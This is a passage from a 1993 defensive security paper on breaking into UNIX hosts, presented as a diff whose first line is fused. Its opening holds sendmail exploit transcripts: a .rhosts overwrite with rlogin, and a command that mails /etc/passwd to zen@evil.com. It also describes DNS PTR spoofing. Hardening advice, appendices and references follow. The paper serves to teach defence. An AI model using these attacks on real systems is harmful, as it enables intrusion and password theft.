@@ -1,0 +1,429 @@
+AdminGuideToCrackingrcpt to: /home/zen/.rhosts
+ mail from: zen
+ data
+ random garbage
+ .
+ rcpt to: /home/zen/.rhosts
+ mail from: zen
+ data
+ evil.com
+ .
+ quit
+ EOSM
+
+ evil % /bin/sh evil_sendmail
+ Trying 128.128.128.1
+ Connected to victim.com
+ Escape character is '^]'.
+ Connection closed by foreign host.
+
+ evil % rlogin victim.com -l zen
+	 Welcome to victim.com!
+ victim %
+
+The second hole, fixed only recently, permitted anyone to specify
+arbitrary shell commands and/or pathnames for the sender and/or
+destination address.  Attempts to keep details secret were in vain, and
+extensive discussions in mailing lists and usenet news groups led to
+disclosure of how to exploit some versions of the bug.  As with many
+UNIX bugs, nearly every vendor's sendmail was vulnerable to the problem,
+since they all share a common source code tree ancestry.  Space
+precludes us from discussing it fully, but a typical attack to get the
+password file might look like this:
+
+ evil % telnet victim.com 25
+ Trying 128.128.128.1...
+ Connected to victim.com
+ Escape character is '^]'.
+ 220 victim.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04
+ mail from: "|/bin/mail zen@evil.com < /etc/passwd"
+ 250 "|/bin/mail zen@evil.com < /etc/passwd"... Sender ok
+ rcpt to: nosuchuser
+ 550 nosuchuser... User unknown
+ data
+ 354 Enter mail, end with "." on a line by itself
+ .
+ 250 Mail accepted
+ quit
+ Connection closed by foreign host.
+ evil %
+
+At the time of writing, version 8.6.4 of sendmail (see Appendix D for
+information on how to get this) is reportedly the only variant of
+sendmail with all of the recent security bugs fixed.
+
+Trust
+-----
+
+For our final topic of vulnerability, we'll digress from the practical
+strategy we've followed previously to go a bit more into the theoretical
+side, and briefly discuss the notion of trust.  The issues and
+implications of vulnerabilities here are a bit more subtle and
+far-reaching than what we've covered before; in the context of this
+paper we use the word trust whenever there is a situation when a server
+(note that any host that allows remote access can be called a server)
+can permit a local resource to be used by a client without password
+authentication when password authentication is normally required.  In
+other words, we arbitrarily limit the discussion to clients in disguise.
+
+There are many ways that a host can trust: .rhosts and hosts.equiv files
+that allow access without password verification; window servers that
+allow remote systems to use and abuse privileges; export files that
+control access via NFS, and more.
+
+Nearly all of these rely on client IP address to hostname conversion to
+determine whether or not service is to be granted.  The simplest method
+uses the /etc/hosts file for a direct lookup.  However, today most hosts
+use either DNS (the Domain Name Service), NIS, or both for name lookup
+service.  A reverse lookup occurs when a server has an IP address (from
+a client host connecting to it) and wishes to get the corresponding
+client hostname.
+
+Although the concept of how host trust works is well understood by most
+system administrators, the _dangers_ of trust, and the _practical_
+problem it represents, irrespective of hostname impersonation, is one of
+the least understood problems we know of on the Internet.  This goes far
+beyond the obvious hosts.equiv and rhosts files; NFS, NIS, windowing
+systems -- indeed, much of the useful services in UNIX are based on the
+concept that well known (to an administrator or user) sites are trusted
+in some way.  What is not understood is how networking so tightly binds
+security between what are normally considered disjoint hosts.
+
+Any form of trust can be spoofed, fooled, or subverted, especially when
+the authority that gets queried to check the credentials of the client
+is either outside of the server's administrative domain, or when the
+trust mechanism is based on something that has a weak form of
+authentication; both are usually the case.
+
+Obviously, if the host containing the database (either NIS, DNS, or
+whatever) has been compromised, the intruder can convince the target
+host that s/he is coming from any trusted host; it is now sufficient to
+find out which hosts are trusted by the target.  This task is often
+greatly helped by examining where system administrators and system
+accounts (such as root, etc.) last logged in from.  Going back to our
+target, victim.com, you note that root and some other system accounts
+logged in from big.victim.com. You change the PTR record for evil.com so
+that when you attempt to rlogin in from evil.com to victim.com,
+victim.com will attempt to look up your hostname and will find what you
+placed in the record.  If the record in the DNS database looks like:
+
+ 1.192.192.192.in-addr.arpa     IN      PTR     evil.com
+
+And you change it to:
+
+ 1.192.192.192.in-addr.arpa     IN      PTR     big.victim.com
+
+then, depending on how naive victim.com's system software is, victim.com
+will believe the login comes from big.victim.com, and, assuming that
+big.victim.com is in the /etc/hosts.equiv or /.rhosts files, you will be
+able to login without supplying a password.  With NIS, it is a simple
+matter of either editing the host database on the NIS master (if this is
+controlled by the intruder) or of spoofing or forcing NIS (see
+discussion on NIS security above) to supply the target with whatever
+information you desire.  Although more complex, interesting, and
+damaging attacks can be mounted via DNS, time and space don't allow
+coverage of these methods here.
+
+Two methods can be used to prevent such attacks.  The first is the most
+direct, but perhaps the most impractical.  If your site doesn't use any
+trust, you won't be as vulnerable to host spoofing.  The other strategy
+is to use cryptographic protocols.  Using the secure RPC protocol (used
+in secure NFS, NIS+, etc.) is one method; although it has been "broken"
+cryptographically, it still provides better assurance than RPC
+authentication schemes that do not use any form of encryption.  Other
+solutions, both hardware (smartcards) and software (Kerberos), are being
+developed, but they are either incomplete or require changes to system
+software.
+
+Appendix B details the results of an informal survey taken from a
+variety of hosts on the Internet.
+
+Protecting the system
+---------------------
+
+It is our hope that we have demonstrated that even some of the most
+seemingly innocuous services run can offer (sometimes unexpectedly)
+ammunition to determined system crackers.  But, of course, if security
+were all that mattered, computers would never be turned on, let alone
+hooked into a network with literally millions of potential intruders.
+Rather than reiterating specific advice on what to switch on or off, we
+instead offer some general suggestions:
+
+o  If you cannot turn off the finger service, consider installing a
+modified finger daemon.  It is rarely necessary to reveal a user's home
+directory and the source of last login.
+
+o  Don't run NIS unless it's absolutely necessary.  Use NFS as little
+as possible.
+
+o  Never export NFS filesystems unrestricted to the world. Try to
+export file systems read-only where possible.
+
+o  Fortify and protect servers (e.g. hosts that provide a service to
+other hosts -- NFS, NIS, DNS, whatever.)  Only allow administrative
+accounts on these hosts.
+
+o  Examine carefully services offered by inetd and the portmapper.
+Eliminate any that aren't explicitly needed.  Use Wietse Venema's inetd
+wrappers, if for no other reason than to log the sources of connections
+to your host.  This adds immeasurably to the standard UNIX auditing
+features, especially with respect to network attacks.  If possible, use
+the loghost mechanism of syslog to collect security-related information
+on a secure host.
+
+o  Eliminate trust unless there is an absolute need for it.  Trust is
+your enemy.
+
+o  Use shadow passwords and a passwd command that disallows poor
+passwords.  Disable or delete unused/dormant system or user accounts.
+
+o  Keep abreast of current literature (see our suggested reading list and
+bibliography at the end of this paper) and security tools; communicate
+to others about security problems and incidents.  At minimum, subscribe
+to the CERT mailing list and phrack magazine (plus the firewalls mailing
+list, if your site is using or thinking about installing a firewall) and
+read the usenet security newsgroups to get the latest information on
+security problems.  Ignorance is the deadliest security problem we are
+aware of.
+
+o  Install all vendor security patches as soon as possible, on all of
+your hosts.  Examine security patch information for other vendors - many
+bugs (rdist, sendmail) are common to many UNIX variants.
+
+It is interesting to note that common solutions to security problems
+such as running Kerberos or using one-time passwords or digital tokens
+are ineffective against most of the attacks we discuss here.  We
+heartily recommend the use of such systems, but be aware that they are
+_not_ a total security solution -- they are part of a larger struggle to
+defend your system.
+
+Conclusions
+-----------
+
+Perhaps none of the methods shown here are surprising; when writing this
+paper, we didn't learn very much about how to break into systems.  What
+we _did_ learn was, while testing these methods out on our own systems
+and that of friendly sites, just how effective this set of methods is
+for gaining access to a typical (UNIX) Internet host.  Tiring of trying
+to type these in all by hand, and desiring to keep our own systems more
+secure, we decided to implement a security tool (SATAN) that attempts to
+check remote hosts for at least some of the problems discussed here.
+The typical response, when telling people about our paper and our tool
+was something on the order of "that sounds pretty dangerous -- I hope
+you're not going to give it out to everybody.  But you since you can
+trust me, may I have a copy of it?"
+
+We never set out to create a cookbook or toolkit of methods and programs
+on how to break into systems -- instead, we saw that these same methods
+were being used, every day, against ourselves and against friendly
+system administrators.  We believe that by propagating information that
+normally wasn't available to those outside of the underworld, we can
+increase security by raising awareness.  Trying to restrict access to
+"dangerous" security information has never seemed to be a very effective
+method for increasing security; indeed, the opposite appears to be the
+case, since the system crackers have shown little reticence to share
+their information with each other.
+
+While it is almost certain that some of the information presented here
+is new material to (aspiring) system crackers, and that some will use it
+to gain unauthorized entrance onto hosts, the evidence presented even by
+our ad hoc tests shows that there is a much larger number of insecure
+sites, simply because the system administrators don't know any better --
+they aren't stupid or slow, they simply are unable to spend the very
+little free time that they have to explore all of the security issues
+that pertain to their systems.  Combine that with no easy access to this
+sort of information and you have poorly defended systems.  We (modestly)
+hope that this paper will provide badly-needed data on how systems are
+broken into, and further, to explain _why_ certain steps should be taken
+to secure a system.  Knowing why something is a problem is, in our
+opinion, the real key to learning and to making an informed, intelligent
+choice as to what security really means for your site.
+
+----
+
+Appendix A:
+
+SATAN (Security Analysis Tool for Auditing Networks)
+
+Originally conceived some years ago, SATAN is actually the prototype of
+a much larger and more comprehensive vision of a security tool.  In its
+current incarnation, SATAN remotely probes and reports various bugs and
+weaknesses in network services and windowing systems, as well as
+detailing as much generally useful information as possible about the
+target(s).  It then processes the data with a crude filter and what
+might be termed an expert system to generate the final security
+analysis.  While not particularly fast, it is extremely modular and easy
+to modify.
+
+SATAN consists of several sub-programs, each of which is an executable
+file (perl, shell, compiled C binary, whatever) that tests a host for a
+given potential weakness.  Adding further test programs is as simple as
+putting an executable into the main directory with the extension ".sat";
+the driver program will automatically execute it.  The driver generates
+a set of targets (using DNS and a fast version of ping together to get
+"live" targets), and then executes each of the programs over each of the
+targets.  A data filtering/interpreting program then analyzes the
+output, and lastly a reporting program digests everything into a more
+readable format.
+
+The entire package, including source code and documentation, will be
+made freely available to the public, via anonymous ftp and by posting it
+to one of the numerous source code groups on the Usenet.
+
+----
+
+Appendix B:
+
+An informal survey conducted on about a dozen Internet sites
+(educational, military, and commercial, with over 200 hosts and 40000
+accounts) revealed that on the average, close to 10 percent of a site's
+accounts had .rhosts files.  These files averaged six trusted hosts
+each; however, it was not uncommon to have well over one hundred entries
+in an account's .rhosts file, and on a few occasions, the number was
+over five hundred!  (This is not a record one should be proud of
+owning.)  In addition, _every_ site directly on the internet (one site
+was mostly behind a firewall) trusted a user or host at another site --
+thus, the security of the site was not under the system administrators
+direct control.  The larger sites, with more users and hosts, had a
+lower percentage of users with .rhosts files, but the size of .rhosts
+files increased, as well as the number of trusted off-site hosts.
+
+Although it was very difficult to verify how many of the entries were
+valid, with such hostnames such as "Makefile", "Message-Id:", and
+"^Cs^A^C^M^Ci^C^MpNu^L^Z^O", as well as quite a few wildcard entries, we
+question the wisdom of putting a site's security in the hands of its
+users.  Many users (especially the ones with larger .rhosts files)
+attempted to put shell-style comments in their .rhosts files, which most
+UNIX systems attempt to resolve as valid host names.  Unfortunately, an
+attacker can then use the DNS and NIS hostname spoofing techniques
+discussed earlier to set their hostname to "#" and freely log in.  This
+puts a great many sites at risk (at least one major vendor ships their
+systems with comments in their /etc/hosts.equiv files.)
+
+You might think that these sites were not typical, and, as a matter of
+fact, they weren't.  Virtually all of the administrators knew a great
+deal about security and write security programs for a hobby or
+profession, and many of the sites that they worked for did either
+security research or created security products.  We can only guess at
+what a "typical" site might look like.
+
+----
+
+Appendix C:
+
+After receiving mail from a site that had been broken into from one of
+our systems, an investigation was started.  In time, we found that the
+intruder was working from a list of ".com" (commercial) sites, looking
+for hosts with easy-to steal password files.  In this case,
+"easy-to-steal" referred to sites with a guessable NIS domainname and an
+accessible NIS server.  Not knowing how far the intruder had gotten, it
+looked like a good idea to warn the sites that were in fact vulnerable
+to password file theft.  Of the 656 hosts in the intruder's hit list, 24
+had easy-to-steal password files -- about one in twenty-five hosts!  One
+third of these files contained at least one password-less account with
+an interactive shell.  With a grand total of 1594 password-file entries,
+a ten-minute run of a publically-available password cracker (Crack)
+revealed more than 50 passwords, using nothing but a low-end Sun
+workstation.  Another 40 passwords were found within the next 20
+minutes; and a root password was found in just over an hour. The result
+after a few days of cracking: five root passwords found, 19 out of 24
+password files (eighty percent) with at least one known password, and
+259 of 1594 (one in six) passwords guessed.
+
+----
+
+Appendix D:
+
+How to get some free security resources on the Internet
+
+Mailing lists:
+
+o  The CERT (Computer Emergency Response Team) advisory mailing list.
+Send e-mail to cert@cert.org, and ask to be placed on their mailing
+list.
+
+o  The Phrack newsletter.  Send an e-mail message to
+phrack@well.sf.ca.us and ask to be added to the list.
+
+o  The Firewalls mailing list.  Send the following line to
+majordomo@greatcircle.com:
+
+    subscribe firewalls
+
+o  Computer Underground Digest.  Send e-mail to
+tk0jut2@mvs.cso.niu.edu, asking to be placed on the list.
+
+Free Software:
+
+COPS (Computer Oracle and Password System) is available via anonymous
+ftp from archive.cis.ohio-state.edu, in pub/cops/1.04+.
+
+The tcp wrappers are available via anonymous ftp from ftp.win.tue.nl,
+in pub/security.
+
+Crack is available from ftp.uu.net, in /usenet/comp.sources.misc/volume28.
+
+TAMU is a UNIX auditing tool that is part of a larger suite of excellent
+tools put out by a group at the Texas A&M University.  They can be
+gotten via anonymous ftp at net.tamu.edu, in pub/security/TAMU.
+
+Sources for ftpd and many other network utilities can be found in
+ftp.uu.net, in packages/bsd-sources.
+
+Source for ISS (Internet Security Scanner), a tool that remotely scans
+for various network vulnerabilities, is available via anonymous ftp from
+ftp.uu.net, in usenet/comp.sources.misc/volume40/iss.
+
+Securelib is available via anonymous ftp from ftp.uu.net, in
+usenet/comp.sources.misc/volume36/securelib.
+
+The latest version of berkeley sendmail is available via anonymous ftp
+from ftp.cs.berkeley.edu, in ucb/sendmail.
+
+Tripwire, a UNIX filesystem integrity checker+, is available via anonymous
+ftp at ftp.cs.purdue.edu, in pub/spaf/COAST/Tripwire.
+
+----
+
+Bibliography:
+
+Baldwin, Robert W., Rule Based Analysis of Computer Security,
+Massachusetts Institute of Technology, June 1987.
+
+Bellovin, Steve, Using the Domain Name System for System Break-ins,
+1992 (unpublished).
+
+Massachusetts Institute of Technology, X Window System Protocol,
+Version 11, 1990.
+
+Shimomura, Tsutomu, private communication.
+
+Sun Microsystems, OpenWindows V3.0.1 User Commands, March 1992.
+
+----
+
+Suggested reading:
+
+Bellovin, Steve -- "Security Problms in the TCP/IP Protocol Suite", 
+Computer Communication Review 19 (2), 1989; a comment by Stephen
+Kent appears in volume 19 (3), 1989.
+
+Garfinkel, Simson and Spafford, Gene, "Practical UNIX Security",
+O'Reilly and Associates, Inc., 1992.
+
+Hess, David, Safford, David, and Pooch, Udo, "A UNIX Network Protocol
+Study: Network Information Service", Computer Communication Review
+22 (5) 1992.
+
+Phreak Accident, Playing Hide and Seek, UNIX style, Phrack, Volume
+Four, Issue Forty-Three, File 14 of 27.
+
+Ranum, Marcus, "Firewalls" internet electronic mailing list, Sept
+1993.
+
+Schuba, Christoph, "Addressing Weaknesses in the Domain Name System
+Protocal", Purdue University, August 1993.
+
+Thompson, Ken, Reflections on Trusting Trust, Communications of the ACM
+27 (8), 1984.
+
